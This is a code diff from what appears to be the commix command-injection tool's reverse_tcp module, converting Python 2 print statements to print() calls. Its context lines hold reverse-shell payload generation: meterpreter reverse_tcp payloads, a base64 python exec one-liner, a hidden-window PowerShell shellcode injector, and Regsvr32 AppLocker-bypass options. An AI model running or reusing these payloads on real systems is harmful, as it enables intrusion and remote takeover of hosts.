@@ -33,7 +33,7 @@ Check for available shell options.
 def shell_options(option):
   if option.lower() == "reverse_tcp":
     warn_msg = "You are already into the '" + option.lower() + "' mode."
-    print settings.print_warning_msg(warn_msg)
+    print(settings.print_warning_msg(warn_msg))
   elif option.lower() == "?": 
     menu.reverse_tcp_options()
   elif option.lower() == "quit": 
@@ -44,7 +44,7 @@ def shell_options(option):
     if option[4:10].lower() == "rhost ":
       err_msg =  "The '" + option[4:9].upper() + "' option, is not "
       err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
-      print settings.print_error_msg(err_msg)  
+      print(settings.print_error_msg(err_msg))  
     if option[4:10].lower() == "lport ":
       check_lport(option[10:])
     if option[4:12].lower() == "srvport ":
@@ -73,14 +73,14 @@ Error msg if the attack vector is available only for Windows targets.
 """
 def windows_only_attack_vector():
     error_msg = "This attack vector is available only for Windows targets."
-    print settings.print_error_msg(error_msg)
+    print(settings.print_error_msg(error_msg))
 
 """
 Message regarding the MSF handler.
 """
 def msf_launch_msg(output):
     info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
-    print settings.print_info_msg(info_msg)
+    print(settings.print_info_msg(info_msg))
     info_msg = "Once the loading is done, press here any key to continue..."
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdin.readline().replace("\n","")
@@ -112,7 +112,7 @@ def set_php_working_dir():
       break
     else:
       err_msg = "'" + php_dir + "' is not a valid answer."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
 """
@@ -140,7 +140,7 @@ def set_python_working_dir():
       break
     else:
       err_msg = "'" + python_dir + "' is not a valid answer."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
 """
@@ -148,7 +148,7 @@ check / set lhost option for reverse TCP connection
 """
 def check_lhost(lhost):
   settings.LHOST = lhost
-  print "LHOST => " + settings.LHOST
+  print("LHOST => " + settings.LHOST)
   return True
 
 """
@@ -158,11 +158,11 @@ def check_lport(lport):
   try:  
     if float(lport):
       settings.LPORT = lport
-      print "LPORT => " + settings.LPORT
+      print("LPORT => " + settings.LPORT)
       return True
   except ValueError:
     err_msg = "The provided port must be numeric (i.e. 1234)"
-    print settings.print_error_msg(err_msg)
+    print(settings.print_error_msg(err_msg))
     return False
 
 """
@@ -172,11 +172,11 @@ def check_srvport(srvport):
   try:  
     if float(srvport):
       settings.SRVPORT = srvport
-      print "SRVPORT => " + settings.SRVPORT
+      print("SRVPORT => " + settings.SRVPORT)
       return True
   except ValueError:
     err_msg = "The provided port must be numeric (i.e. 1234)"
-    print settings.print_error_msg(err_msg)
+    print(settings.print_error_msg(err_msg))
     return False
 
 """
@@ -184,7 +184,7 @@ check / set uripath option for reverse TCP connection
 """
 def check_uripath(uripath):
   settings.URIPATH = uripath
-  print "URIPATH => " + settings.URIPATH
+  print("URIPATH => " + settings.URIPATH)
   return True
 
 """
@@ -235,7 +235,7 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbs
     # Invalid option    
     else:
       err_msg = "The '" + nc_version + "' option, is not valid."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       continue
 
   while True:
@@ -257,7 +257,7 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbs
       raise SystemExit()
     else:
       err_msg = "'" + enable_bin_dir + "' is not a valid answer."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
   if nc_version != '4':
@@ -357,7 +357,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
     elif other_shell == '8':
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print settings.print_error_msg(error_msg)
+        print(settings.print_error_msg(error_msg))
         continue
 
       payload = "php/meterpreter/reverse_tcp"
@@ -376,7 +376,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -393,7 +393,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
       break
 
     # Python-reverse-shell
@@ -431,7 +431,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
     elif other_shell == '10':
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print settings.print_error_msg(error_msg)
+        print(settings.print_error_msg(error_msg))
         continue
 
       payload = "python/meterpreter/reverse_tcp"
@@ -451,7 +451,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           data = ''.join(data)
           data = base64.b64encode(data)
 
-        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -468,7 +468,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
-        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
       break
     
     # Powershell injection attacks
@@ -496,12 +496,12 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
             output = "regsvr32_applocker_bypass_server.rc"
           else:
             err_msg = "The '" + windows_reverse_shell + "' option, is not valid."  
-            print settings.print_error_msg(err_msg)
+            print(settings.print_error_msg(err_msg))
             continue
 
           if not os.path.exists(settings.METASPLOIT_PATH):
             error_msg = settings.METASPLOIT_ERROR_MSG
-            print settings.print_error_msg(error_msg)
+            print(settings.print_error_msg(error_msg))
             continue
 
           payload = "windows/meterpreter/reverse_tcp"
@@ -518,7 +518,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
               # Greetz to Dave Kennedy (@HackingDave)
               powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
               other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
-              print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+              print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
               with open(output, 'w+') as filewrite:
                 filewrite.write("use exploit/multi/handler\n"
                                 "set payload " + payload + "\n"
@@ -527,7 +527,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
                                 "exploit\n\n")
               msf_launch_msg(output)
             except:
-              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+              print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
             break
 
           # TrustedSec's Magic Unicorn (3rd Party)
@@ -556,7 +556,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
                 other_shell = urllib.quote_plus(other_shell) 
-                print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+                print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
                 # Remove the ouput file
                 os.remove(output)
                 with open("unicorn.rc", 'w+') as filewrite:
@@ -571,7 +571,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
               except:
                 continue 
             except:
-              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+              print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
             break
 
           # Regsvr32.exe application whitelisting bypass
@@ -614,12 +614,12 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
           payload = "windows/meterpreter/reverse_tcp"
         else:
           err_msg = "The '" + web_delivery + "' option, is not valid."  
-          print settings.print_error_msg(err_msg)
+          print(settings.print_error_msg(err_msg))
           continue
 
         if not os.path.exists(settings.METASPLOIT_PATH):
           error_msg = settings.METASPLOIT_ERROR_MSG
-          print settings.print_error_msg(error_msg)
+          print(settings.print_error_msg(error_msg))
           continue
 
         if 'payload' in locals():
@@ -668,7 +668,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
     # Invalid option
     else:
       err_msg = "The '" + other_shell + "' option, is not valid."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       continue
 
   return other_shell
@@ -687,7 +687,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TC
 
     if reverse_tcp_option.lower() == "reverse_tcp": 
       warn_msg = "You are already into the '" + reverse_tcp_option.lower() + "' mode."
-      print settings.print_warning_msg(warn_msg)
+      print(settings.print_warning_msg(warn_msg))
       continue
 
     # Option 1 - Netcat shell
@@ -713,7 +713,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TC
     # Invalid option    
     else:
       err_msg = "The '" + reverse_tcp_option + "' option, is not valid."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       continue
 
   return reverse_tcp_option
@@ -727,7 +727,7 @@ def configure_reverse_tcp(separator):
     option = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
     if option.lower() == "reverse_tcp": 
       warn_msg = "You are already into the '" + option.lower() + "' mode."
-      print settings.print_warning_msg(warn_msg)
+      print(settings.print_warning_msg(warn_msg))
       continue
     if option.lower() == "?": 
       menu.reverse_tcp_options()
@@ -755,7 +755,7 @@ def configure_reverse_tcp(separator):
       elif option[4:10].lower() == "rhost ":
         err_msg =  "The '" + option[4:9].upper() + "' option, is not "
         err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
-        print settings.print_error_msg(err_msg)  
+        print(settings.print_error_msg(err_msg))  
         continue  
       elif option[4:10].lower() == "lport ":
         if check_lport(option[10:]):
@@ -771,11 +771,11 @@ def configure_reverse_tcp(separator):
         check_uripath(option[12:])
       else:
         err_msg = "The '" + option + "' option, is not valid."
-        print settings.print_error_msg(err_msg)
+        print(settings.print_error_msg(err_msg))
         pass
     else:
       err_msg = "The '" + option + "' option, is not valid."
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
 # eof
